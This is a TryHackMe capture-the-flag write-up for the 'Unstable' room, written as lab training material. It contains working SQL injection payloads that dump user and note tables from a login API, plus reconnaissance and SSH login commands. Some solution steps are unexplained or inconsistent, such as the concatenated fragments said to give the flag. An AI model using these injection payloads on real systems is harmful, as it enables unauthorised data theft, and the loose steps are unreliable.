# TryHackMe: Unstable — Writeup

Room today is called **Unstable**, and honestly the name checks out — nginx front end, an undocumented API, a family full of hidden notes. Let's get into it.

## Recon

Standard start, full port sweep with nmap:

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/unstable]
└─$ nmap -Pn -sS -sV -sC -A -T4 -p- 10.49.180.20

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
80/tcp open  http    nginx 1.14.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: nginx/1.14.1

Nmap done: 1 IP address (1 host up) scanned in 232.33 seconds
```

Two ports open — SSH on 22 and nginx 1.14.1 on 80. Nothing fancy, no title on the web root. Hit port 80 in the browser just to confirm — blank page, nothing to see here directly.

Straight to directory busting:

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/unstable]
└─$ gobuster dir -u http://10.49.180.20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/info                 (Status: 200) [Size: 160]
/get_image            (Status: 500) [Size: 291]
```

Anddd we got `/info` (200) pretty quick, with `/get_image` (500) turning up a bit later in the scan. Both look interesting, `/info` first.

## /info leaks the plan

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/unstable]
└─$ curl http://10.49.180.20/info

"The login API needs to be called with the username and password form fields fields.
It has not been fully tested yet so may not be full developed and secure"
```

Thanks for the tip, devs. Straight up telling us there's a login API and that it's probably vulnerable. So the target is clearly `/api/login`.

## Finding the login API

GET request to `/api/login` in the browser first — 405 Method Not Allowed. Confirmed the same in Burp:

```
GET /api/login HTTP/1.1
Host: 10.49.180.20
...

HTTP/1.1 405 Method Not Allowed
```

It exists, it just wants POST. Switched to POST with dummy creds (`test`/`test`):

```
POST /api/login HTTP/1.1
Host: 10.49.180.20
Content-Length: 35

"username"=test&"password"=test

HTTP/1.1 200 OK
Content-Type: application/json

"The username or password passed are not correct."
```

Good, valid endpoint, normal auth-fail response. Time to see if it's actually as "not secure" as `/info` promised. Threw a basic UNION-based SQLi probe into the username field:

```
POST /api/login HTTP/1.1
Host: 10.49.180.20
Content-Length: 57

"username"=test' UNION SELECT 1,2 -- -&"password"=test

HTTP/1.1 200 OK
Content-Type: application/json

"The username or password passed are not correct."
```

Same generic fail message, but no SQL error thrown — that's the confirmation I needed to move to curl and actually dig into the injection properly.

## Confirming and exploiting the SQLi

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/unstable]
└─$ curl http://10.49.180.20/api/login -X POST -d "username=admin' UNION SELECT 1,sqlite_version(); -- -&password=admin"
[
  [1, "3.26.0"]
]
```

**SQLite backend, confirmed injectable.** From here it's just enumeration:

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/unstable]
└─$ curl http://10.49.180.20/api/login -X POST -d "username=admin' UNION SELECT 1,tbl_name FROM sqlite_master; -- -&password=admin"
[
  [1, "notes"],
  [1, "sqlite_sequence"],
  [1, "users"]
]
```

Two tables worth caring about — `users` and `notes`. Dumped the schema for both with `sql FROM sqlite_master`, then pulled the data:

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/unstable]
└─$ curl http://10.49.180.20/api/login -X POST -d "username=admin' UNION SELECT username,password FROM users; -- -&password=admin"
[
  ["julias", "Red"],
  ["linda", "Green"],
  ["marnie", "Yellow "],
  ["mary_ann", "continue..."],
  ["vincent", "Orange"]
]
```

Interesting — the "passwords" are just colours (with `mary_ann` teasing "continue..."). Definitely a puzzle-shaped hint rather than real creds. Pulled `notes` next:

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/unstable]
└─$ curl http://10.49.180.20/api/login -X POST -d "username=admin' UNION SELECT user_id,notes FROM notes-- -&password=admin"
[
  [1, "I have left my notes on the server.  They will me help get the family back together."],
  [1, "My Password is eaf0651dabef9c7de8a70843030924d335a2a8ff5fd1b13c4cb099e66efe25ecaa607c4b7dd99c43b0c01af669c90fd6a14933422cf984324f645b84427343f4"]
]
```

A password hash, and a hint pointing at SSH.

## SSH in as mary_ann

Tried the hash straight as the SSH password for `mary_ann` (the account tied to that note):

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/unstable]
└─$ ssh mary_ann@10.49.180.20
mary_ann@10.49.180.20's password: 
Last login: Sun Feb 14 09:56:18 2021 from 192.168.20.38
Hello Mary Ann
[mary_ann@UnstableTwin ~]$
```

Logged straight in. **User flag time:**

```
[mary_ann@UnstableTwin ~]$ cat user.flag
THM{Mary_Ann_notes}
```

Checked `server_notes.txt` while I was in there:

```
[mary_ann@UnstableTwin ~]$ cat server_notes.txt
Now you have found my notes you now you need to put my extended family together.
We need to GET their IMAGE for the family album. These can be retrieved by NAME.
You need to find all of them and a picture of myself!
```

So that explains the `/get_image` endpoint gobuster picked up earlier. Time to go collect a family album.

## Pulling images and cracking steghide

`/get_image` wants a GET-style query param (`--get -d`), keyed off username:

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/unstable]
└─$ curl -s http://10.49.180.20/get_image --get -d "name=vincent" -o vincent.jpg
└─$ curl -s http://10.49.180.20/get_image --get -d "name=julias" -o julias.jpg
└─$ curl -s http://10.49.180.20/get_image --get -d "name=mary_ann" -o mary_ann.jpg
└─$ curl -s http://10.49.180.20/get_image --get -d "name=marnie" -o marnie.jpg
└─$ curl -s http://10.49.180.20/get_image --get -d "name=linda" -o linda.jpg
```

Grabbed one image per user from the `users` table we dumped earlier. Given the "colour = password" gag from the DB, steghide with an empty passphrase felt like the obvious move — and it worked on most of them (a couple needed re-downloading, looked like truncated/corrupted pulls the first time round):

```
└─$ steghide extract -sf mary_ann.jpg
Enter passphrase: 
wrote extracted data to "mary_ann.txt".

└─$ cat mary_ann.txt
You need to find all my children and arrange in a rainbow!
```

```
└─$ steghide extract -sf julias.jpg
Enter passphrase: 
wrote extracted data to "julias.txt".

└─$ cat julias.txt
Red - 1DVsdb2uEE0k5HK4GAIZ
```

```
└─$ steghide extract -sf vincent.jpg
Enter passphrase: 
wrote extracted data to "vincent.txt".

└─$ cat vincent.txt
Orange - PS0Mby2jomUKLjvQ4OSw
```

```
└─$ steghide --extract -sf linda.jpg
Enter passphrase: 
wrote extracted data to "linda.txt".

└─$ cat linda.txt
Green - eVYvs6J6HKpZWPG8pfeHoNG1
```

```
└─$ steghide --extract -sf marnie.jpg
Enter passphrase: 
wrote extracted data to "marnie.txt".

└─$ cat marnie.txt
Yellow = jKLNAAeCdl2J8BCRuXVX
```

Each image hid a colour + fragment. Lined them all up:

```
Red    = julias  = 1DVsdb2uEE0k5HK4GAIZ
Orange = vincent = PS0Mby2jomUKLjvQ4OSw
Yellow = marnie  = jKLNAAeCdl2J8BCRuXVX
Green  = linda   = eVYvs6J6HKpZWPG8pfeHoNG1
```

"Arrange in a rainbow" — red, orange, yellow, green — string the fragments together in that order and:

```
Flag is THM{The_Family_Is_Back_Together}
```

## Summary

- SQLi in an undocumented `/api/login` endpoint (which `/info` basically handed us) → dumped `users` and `notes` tables
- Leaked hash doubled as an SSH password for `mary_ann` → user flag
- `notes` + `server_notes.txt` pointed at a hidden `/get_image` endpoint
- Steghide (empty passphrase) on each family member's photo revealed rainbow-ordered flag fragments → root flag

Fun little chain — SQLi to SSH to steganography, all tied together by "the family" theme. Nothing too heavy technically, but a nice reminder to always read the hints devs accidentally leave in places like `/info`.

Thanks for reading!
